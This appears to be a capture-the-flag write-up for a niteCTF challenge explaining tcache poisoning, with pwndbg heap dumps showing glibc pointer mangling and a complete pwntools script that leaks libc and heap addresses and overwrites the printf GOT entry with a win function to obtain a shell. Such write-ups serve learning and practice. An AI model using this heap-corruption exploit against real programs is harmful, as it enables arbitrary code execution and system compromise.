# tcache poisoning - niteCTF
---
### Explanation:

- tcache poisoning tricks the malloc into pointing to an arbitrary address. Since we can read after a chunk is freed we can get the libc and heap leak.

```python
for i in range(0,10):
  allocate(i,128)

for i in range(0,10):
  free(i)
```

<aside>
ðŸ’¡ Pointer mangling: The address in the freed chunks are XORed with the heap_address >>> 12 to make it difficult for the attacker to exploit the heap ?

</aside>

- Here the malloc allocates 10 heap chunks (7 tcache bins) and the free will free them and tcache is updated with the following structure.

```python
tcachebins
0x90 [  7]: 0x18e7600 â€”â–¸ 0x18e7570 â€”â–¸ 0x18e74e0 â€”â–¸ 0x18e7450 â€”â–¸ 0x18e73c0 â€”â–¸ 0x18e7330 â€”â–¸ 0x18e72a0 â—‚â€” 0x0
```

```
0x18e7290	0x0000000000000000	0x0000000000000091	................
0x18e72a0	0x00000000000018e7	0x7bb84541884b3e05	.........>K.AE.{	 <-- tcachebins[0x90][6/7]
0x18e72b0	0x0000000000000000	0x0000000000000000	................
0x18e72c0	0x0000000000000000	0x0000000000000000	................
0x18e72d0	0x0000000000000000	0x0000000000000000	................
0x18e72e0	0x0000000000000000	0x0000000000000000	................
0x18e72f0	0x0000000000000000	0x0000000000000000	................
0x18e7300	0x0000000000000000	0x0000000000000000	................
0x18e7310	0x0000000000000000	0x0000000000000000	................
0x18e7320	0x0000000000000000	0x0000000000000091	................
0x18e7330	0x00000000018e6a47	0x7bb84541884b3e05	Gj.......>K.AE.{	 <-- tcachebins[0x90][5/7]
0x18e7340	0x0000000000000000	0x0000000000000000	................
0x18e7350	0x0000000000000000	0x0000000000000000	................
0x18e7360	0x0000000000000000	0x0000000000000000	................
0x18e7370	0x0000000000000000	0x0000000000000000	................
0x18e7380	0x0000000000000000	0x0000000000000000	................
0x18e7390	0x0000000000000000	0x0000000000000000	................
0x18e73a0	0x0000000000000000	0x0000000000000000	................
0x18e73b0	0x0000000000000000	0x0000000000000091	................
0x18e73c0	0x00000000018e6bd7	0x7bb84541884b3e05	.k.......>K.AE.{	 <-- tcachebins[0x90][4/7]
0x18e73d0	0x0000000000000000	0x0000000000000000	................
0x18e73e0	0x0000000000000000	0x0000000000000000	................
0x18e73f0	0x0000000000000000	0x0000000000000000	................
0x18e7400	0x0000000000000000	0x0000000000000000	................
0x18e7410	0x0000000000000000	0x0000000000000000	................
0x18e7420	0x0000000000000000	0x0000000000000000	................
0x18e7430	0x0000000000000000	0x0000000000000000	................
0x18e7440	0x0000000000000000	0x0000000000000091	................
0x18e7450	0x00000000018e6b27	0x7bb84541884b3e05	'k.......>K.AE.{	 <-- tcachebins[0x90][3/7]
0x18e7460	0x0000000000000000	0x0000000000000000	................
0x18e7470	0x0000000000000000	0x0000000000000000	................
0x18e7480	0x0000000000000000	0x0000000000000000	................
0x18e7490	0x0000000000000000	0x0000000000000000	................
0x18e74a0	0x0000000000000000	0x0000000000000000	................
0x18e74b0	0x0000000000000000	0x0000000000000000	................
0x18e74c0	0x0000000000000000	0x0000000000000000	................
0x18e74d0	0x0000000000000000	0x0000000000000091	................
0x18e74e0	0x00000000018e6cb7	0x7bb84541884b3e05	.l.......>K.AE.{	 <-- tcachebins[0x90][2/7]
0x18e74f0	0x0000000000000000	0x0000000000000000	................
0x18e7500	0x0000000000000000	0x0000000000000000	................
0x18e7510	0x0000000000000000	0x0000000000000000	................
0x18e7520	0x0000000000000000	0x0000000000000000	................
0x18e7530	0x0000000000000000	0x0000000000000000	................
0x18e7540	0x0000000000000000	0x0000000000000000	................
0x18e7550	0x0000000000000000	0x0000000000000000	................
0x18e7560	0x0000000000000000	0x0000000000000091	................
0x18e7570	0x00000000018e6c07	0x7bb84541884b3e05	.l.......>K.AE.{	 <-- tcachebins[0x90][1/7]
0x18e7580	0x0000000000000000	0x0000000000000000	................
0x18e7590	0x0000000000000000	0x0000000000000000	................
0x18e75a0	0x0000000000000000	0x0000000000000000	................
0x18e75b0	0x0000000000000000	0x0000000000000000	................
0x18e75c0	0x0000000000000000	0x0000000000000000	................
0x18e75d0	0x0000000000000000	0x0000000000000000	................
0x18e75e0	0x0000000000000000	0x0000000000000000	................
0x18e75f0	0x0000000000000000	0x0000000000000091	................
0x18e7600	0x00000000018e6d97	0x7bb84541884b3e05	.m.......>K.AE.{	 <-- tcachebins[0x90][0/7]
0x18e7610	0x0000000000000000	0x0000000000000000	................
0x18e7620	0x0000000000000000	0x0000000000000000	................
0x18e7630	0x0000000000000000	0x0000000000000000	................
0x18e7640	0x0000000000000000	0x0000000000000000	................
0x18e7650	0x0000000000000000	0x0000000000000000	................
0x18e7660	0x0000000000000000	0x0000000000000000	................
0x18e7670	0x0000000000000000	0x0000000000000000	................
0x18e7680	0x0000000000000000	0x0000000000020981	................	 <-- Top chunk
```

- edit the freed chunk to the GOT address of a function like printf. then malloc to get into the fake chunk inside the GOT.

```
pwndbg> tcachebins
tcachebins
0x90 [  5]: 0x7fe84cfb3374 (printf_size+2084) â—‚â€” sub byte ptr [r8 - 0x5c016fe], r9b
```

- Now malloc one more time to go into the printf GOT and then edit the value to the win function to get a shell when printf is called next.

```python
p = start()
for i in range(0,10):
  allocate(i,128)

for i in range(0,10):
  free(i)
pause()
bin0_leak = leak(0)
bin1_leak = leak(1)
bin7_leak = leak(7)

libc.address=bin7_leak-2202848
heap_leak=(bin0_leak ^ bin1_leak)

log.info("Libc Leak Found: %s" %hex(libc.address))
log.info("Tcache Leak Found: %s" %hex(heap_leak))

overwrite_addr = e.got['printf']
encrypted_ptr = (bin0_leak ^ overwrite_addr)

edit(6,p64(encrypted_ptr))
allocate(5,128)
allocate(3,128)
pause()
edit(3,p64(e.sym['win']))

p.interactive()
```